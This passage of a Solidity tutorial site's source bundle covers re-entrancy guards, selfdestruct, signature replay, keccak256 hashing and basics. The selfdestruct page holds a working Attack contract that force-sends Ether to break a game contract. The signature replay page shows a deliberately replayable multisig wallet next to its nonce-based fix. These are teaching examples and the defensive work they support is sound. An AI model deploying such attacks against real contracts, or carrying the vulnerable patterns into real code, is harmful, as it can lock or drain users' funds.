before calling external contracts</li>\n<li>Use function modifiers that prevent re-entrancy</li>\n</ul>\n<p>Here is a example of a re-entracy guard</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">ReEntrancyGuard</span> </span>{\n    <span class=\"hljs-keyword\">bool</span> <span class=\"hljs-keyword\">internal</span> locked;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">modifier</span> <span class=\"hljs-title\">noReentrant</span>(<span class=\"hljs-params\"></span>) </span>{\n        <span class=\"hljs-built_in\">require</span>(!locked, <span class=\"hljs-string\">\"No re-entrancy\"</span>);\n        locked = <span class=\"hljs-literal\">true</span>;\n        <span class=\"hljs-keyword\">_</span>;\n        locked = <span class=\"hljs-literal\">false</span>;\n    }\n}</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Self Destruct\"\nexport const description = \"An example of how to delete your smart contract by calling seldestruct in Solidity\"\n\nconst html = `<p>Contracts can be deleted from the blockchain by calling <code>selfdestruct</code>.</p>\n<p><code>selfdestruct</code> sends all remaining Ether stored in the contract to an\ndesignated address.</p>\n<h3 id=\"vulnerability\">Vulnerability</h3>\n<p>A malicious contract can use <code>selfdestruct</code> to\nforce send Ether to any contract.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">// The goal of this game is to be the 7th player to deposit 1 Ether.</span>\n<span class=\"hljs-comment\">// Players can deposit only 1 Ether at a time.</span>\n<span class=\"hljs-comment\">// Winner will be able to withdraw all Ether.</span>\n\n<span class=\"hljs-comment\">/*\n1. Deploy EtherGame\n2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.\n2. Deploy Attack with address of EtherGame\n3. Call Attack.attack sending 5 ether. This will break the game\n   No one can become the winner.\n\nWhat happened?\nAttack forced the balance of EtherGame to equal 7 ether.\nNow no one can deposit and the winner cannot be set.\n*/</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">EtherGame</span> </span>{\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> targetAmount = <span class=\"hljs-number\">7</span> <span class=\"hljs-literal\">ether</span>;\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> winner;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">deposit</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span> == <span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">ether</span>, <span class=\"hljs-string\">\"You can only send 1 Ether\"</span>);\n\n        <span class=\"hljs-keyword\">uint</span> balance = <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>).<span class=\"hljs-built_in\">balance</span>;\n        <span class=\"hljs-built_in\">require</span>(balance &lt;= targetAmount, <span class=\"hljs-string\">\"Game is over\"</span>);\n\n        <span class=\"hljs-keyword\">if</span> (balance == targetAmount) {\n            winner = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>;\n        }\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">claimReward</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span> == winner, <span class=\"hljs-string\">\"Not winner\"</span>);\n\n        (<span class=\"hljs-keyword\">bool</span> sent, ) = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value</span>: <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>).<span class=\"hljs-built_in\">balance</span>}(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Attack</span> </span>{\n    EtherGame etherGame;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\">EtherGame _etherGame</span>) </span>{\n        etherGame = EtherGame(_etherGame);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">attack</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        <span class=\"hljs-comment\">// You can simply break the game by sending ether so that</span>\n        <span class=\"hljs-comment\">// the game balance &gt;= 7 ether</span>\n\n        <span class=\"hljs-comment\">// cast address to payable</span>\n        <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span> addr = <span class=\"hljs-keyword\">payable</span>(<span class=\"hljs-keyword\">address</span>(etherGame));\n        <span class=\"hljs-built_in\">selfdestruct</span>(addr);\n    }\n}\n\n</code></pre>\n<h3 id=\"preventative-techniques\">Preventative Techniques</h3>\n<p>Don&#39;t rely on <code>address(this).balance</code></p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">EtherGame</span> </span>{\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> targetAmount = <span class=\"hljs-number\">3</span> <span class=\"hljs-literal\">ether</span>;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> balance;\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> winner;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">deposit</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span> == <span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">ether</span>, <span class=\"hljs-string\">\"You can only send 1 Ether\"</span>);\n\n        balance += <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>;\n        <span class=\"hljs-built_in\">require</span>(balance &lt;= targetAmount, <span class=\"hljs-string\">\"Game is over\"</span>);\n\n        <span class=\"hljs-keyword\">if</span> (balance == targetAmount) {\n            winner = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>;\n        }\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">claimReward</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span> == winner, <span class=\"hljs-string\">\"Not winner\"</span>);\n\n        (<span class=\"hljs-keyword\">bool</span> sent, ) = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value</span>: <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>).<span class=\"hljs-built_in\">balance</span>}(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n    }\n}</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Signature Replay\"\nexport const description = \"An example of a contract vulnerable to signature replay attack\"\n\nconst html = `<p>Signing messages off-chain and having a contract that requires that signature before executing\na function is a useful technique.</p>\n<p>For example this technique is used to:</p>\n<ul>\n<li>reduce number of transaction on chain</li>\n<li>gas-less transaction, called <code>meta transcation</code></li>\n</ul>\n<h3 id=\"vulnerability\">Vulnerability</h3>\n<p>Same signature can be used multiple times to execute a function. This can be harmful\nif the signer&#39;s intention was to approve a transaction once.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">experimental</span> <span class=\"hljs-built_in\">ABIEncoderV2</span>;</span>\n\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">\"github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/cryptography/ECDSA.sol\"</span>;\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">MultiSigWallet</span> </span>{\n    <span class=\"hljs-keyword\">using</span> <span class=\"hljs-title\">ECDSA</span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">for</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">bytes32</span></span>;\n\n    <span class=\"hljs-keyword\">address</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">public</span> owners;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">memory</span> _owners</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        owners = _owners;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">deposit</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{}\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\"><span class=\"hljs-built_in\">transfer</span></span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _to, <span class=\"hljs-keyword\">uint</span> _amount, <span class=\"hljs-keyword\">bytes</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">memory</span> _sigs</span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span>\n    </span>{\n        <span class=\"hljs-keyword\">bytes32</span> txHash = getTxHash(_to, _amount);\n        <span class=\"hljs-built_in\">require</span>(_checkSigs(_sigs, txHash), <span class=\"hljs-string\">\"invalid sig\"</span>);\n\n        (<span class=\"hljs-keyword\">bool</span> sent, ) = _to.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value:</span> _amount}(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getTxHash</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _to, <span class=\"hljs-keyword\">uint</span> _amount</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes32</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(_to, _amount));\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">_checkSigs</span>(<span class=\"hljs-params\">\n        <span class=\"hljs-keyword\">bytes</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">memory</span> _sigs,\n        <span class=\"hljs-keyword\">bytes32</span> _txHash\n    </span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">private</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bool</span></span>) </span>{\n        <span class=\"hljs-keyword\">bytes32</span> ethSignedHash = _txHash.toEthSignedMessageHash();\n\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">uint</span> i = <span class=\"hljs-number\">0</span>; i &lt; _sigs.<span class=\"hljs-built_in\">length</span>; i++) {\n            <span class=\"hljs-keyword\">address</span> signer = ethSignedHash.recover(_sigs[i]);\n            <span class=\"hljs-keyword\">bool</span> valid = signer == owners[i];\n\n            <span class=\"hljs-keyword\">if</span> (!valid) {\n                <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;\n            }\n        }\n\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">true</span>;\n    }\n}</code></pre>\n<h3 id=\"preventative-techniques\">Preventative Techniques</h3>\n<p>Sign messages with <code>nonce</code> and address of the contract.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">experimental</span> <span class=\"hljs-built_in\">ABIEncoderV2</span>;</span>\n\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">\"github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/cryptography/ECDSA.sol\"</span>;\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">MultiSigWallet</span> </span>{\n    <span class=\"hljs-keyword\">using</span> <span class=\"hljs-title\">ECDSA</span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">for</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">bytes32</span></span>;\n\n    <span class=\"hljs-keyword\">address</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">public</span> owners;\n    <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">bytes32</span> =&gt; <span class=\"hljs-keyword\">bool</span>) <span class=\"hljs-keyword\">public</span> executed;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">memory</span> _owners</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        owners = _owners;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">deposit</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{}\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\"><span class=\"hljs-built_in\">transfer</span></span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _to, <span class=\"hljs-keyword\">uint</span> _amount, <span class=\"hljs-keyword\">uint</span> _nonce, <span class=\"hljs-keyword\">bytes</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">memory</span> _sigs</span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span>\n    </span>{\n        <span class=\"hljs-keyword\">bytes32</span> txHash = getTxHash(_to, _amount, _nonce);\n        <span class=\"hljs-built_in\">require</span>(!executed[txHash], <span class=\"hljs-string\">\"tx executed\"</span>);\n        <span class=\"hljs-built_in\">require</span>(_checkSigs(_sigs, txHash), <span class=\"hljs-string\">\"invalid sig\"</span>);\n\n        executed[txHash] = <span class=\"hljs-literal\">true</span>;\n\n        (<span class=\"hljs-keyword\">bool</span> sent, ) = _to.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value:</span> _amount}(<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Failed to send Ether\"</span>);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getTxHash</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _to, <span class=\"hljs-keyword\">uint</span> _amount, <span class=\"hljs-keyword\">uint</span> _nonce</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes32</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(<span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>), _to, _amount, _nonce));\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">_checkSigs</span>(<span class=\"hljs-params\">\n        <span class=\"hljs-keyword\">bytes</span>[<span class=\"hljs-number\">2</span>] <span class=\"hljs-keyword\">memory</span> _sigs,\n        <span class=\"hljs-keyword\">bytes32</span> _txHash\n    </span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">private</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bool</span></span>) </span>{\n        <span class=\"hljs-keyword\">bytes32</span> ethSignedHash = _txHash.toEthSignedMessageHash();\n\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">uint</span> i = <span class=\"hljs-number\">0</span>; i &lt; _sigs.<span class=\"hljs-built_in\">length</span>; i++) {\n            <span class=\"hljs-keyword\">address</span> signer = ethSignedHash.recover(_sigs[i]);\n            <span class=\"hljs-keyword\">bool</span> valid = signer == owners[i];\n\n            <span class=\"hljs-keyword\">if</span> (!valid) {\n                <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;\n            }\n        }\n\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">true</span>;\n    }\n}\n\n<span class=\"hljs-comment\">/*\n// owners\n0xe19aea93F6C1dBef6A3776848bE099A7c3253ac8\n0xfa854FE5339843b3e9Bfd8554B38BD042A42e340\n\n// to\n0xe10422cc61030C8B3dBCD36c7e7e8EC3B527E0Ac\n// amount\n100\n// nonce\n0\n// tx hash\n0x12a095462ebfca27dc4d99feef885bfe58344fb6bb42c3c52a7c0d6836d11448\n\n// signatures\n0x120f8ed8f2fa55498f2ef0a22f26e39b9b51ed29cc93fe0ef3ed1756f58fad0c6eb5a1d6f3671f8d5163639fdc40bb8720de6d8f2523077ad6d1138a60923b801c\n0xa240a487de1eb5bb971e920cb0677a47ddc6421e38f7b048f8aa88266b2c884a10455a52dc76a203a1a9a953418469f9eec2c59e87201bbc8db0e4d9796935cb1b\n*/</span></code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Hashing with Keccak256\"\nexport const description = \"Example of hashing using Keccak256 in Solidity\"\n\nconst html = `<p><code>keccak256</code> computes the Keccak-256 hash of the input.</p>\n<p>Some use cases are:</p>\n<ul>\n<li>Creating an deterministic unique ID from a input</li>\n<li>Commit-Reveal scheme</li>\n<li>Compact cryptographic signature (by signing the hash instead of a larger input)</li>\n</ul>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">HashFunction</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">hash</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _text, <span class=\"hljs-keyword\">uint</span> _num, <span class=\"hljs-keyword\">address</span> _addr</span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes32</span></span>)\n    </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(_text, _num, _addr));\n    }\n\n    <span class=\"hljs-comment\">// Example of hash collision</span>\n    <span class=\"hljs-comment\">// Hash collision can occur when you pass more than one dynamic data type</span>\n    <span class=\"hljs-comment\">// to abi.encodePacked. In such case, you should use abi.encode instead.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">collision</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _text, <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _anotherText</span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes32</span></span>)\n    </span>{\n        <span class=\"hljs-comment\">// encodePacked(AAA, BBB) -&gt; AAABBB</span>\n        <span class=\"hljs-comment\">// encodePacked(AA, ABBB) -&gt; AAABBB</span>\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(_text, _anotherText));\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">GuessTheMagicWord</span> </span>{\n    <span class=\"hljs-keyword\">bytes32</span> <span class=\"hljs-keyword\">public</span> answer =\n        <span class=\"hljs-number\">0x60298f78cc0b47170ba79c10aa3851d7648bd96f2f8e46a19dbc777c36fb0c00</span>;\n\n    <span class=\"hljs-comment\">// Magic word is \"Solidity\"</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">guess</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _word</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bool</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(_word)) == answer;\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Hello World\"\nexport const description = \"Hello world in Solidity\"\n\nconst html = `<p><code>pragma</code> specifies the compiler version of Solidity.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-comment\">// compiler version must be greater than or equal to 0.7.6 and less than 0.8.0</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">HelloWorld</span> </span>{\n    <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">public</span> greet = <span class=\"hljs-string\">\"Hello World!\"</span>;\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"If / Else\"\nexport const description = \"If / Else conditional statement in Solidity\"\n\nconst html = `<p>Solidity support conditional statements <code>if</code>, <code>else if</code> and <code>else</code>.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">IfElse</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">foo</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> x</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">if</span> (x &lt; <span class=\"hljs-number\">10</span>) {\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n        } <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (x &lt; <span class=\"hljs-number\">20</span>) {\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;\n        } <span class=\"hljs-keyword\">else</span> {\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">2</span>;\n        }\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Import\"\nexport const description = \"Learn how to import other Solidity files\"\n\nconst html = `<p>You can import local and external files in Solidity.</p>\n<h3 id=\"local\">Local</h3>\n<p>Here is our folder structure.</p>\n<pre><code>├── Import.sol\n└── Foo.sol</code></pre>\n<p>Foo.sol</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Foo</span> </span>{\n    <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">public</span> name = <span class=\"hljs-string\">\"Foo\"</span>;\n}\n</code></pre>\n<p>Import.sol</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">// import Foo.sol from current directory</span>\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">\"./Foo.sol\"</span>;\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Import</span> </span>{\n    <span class=\"hljs-comment\">// Initialize Foo.sol</span>\n    Foo <span class=\"hljs-keyword\">public</span> foo = <span 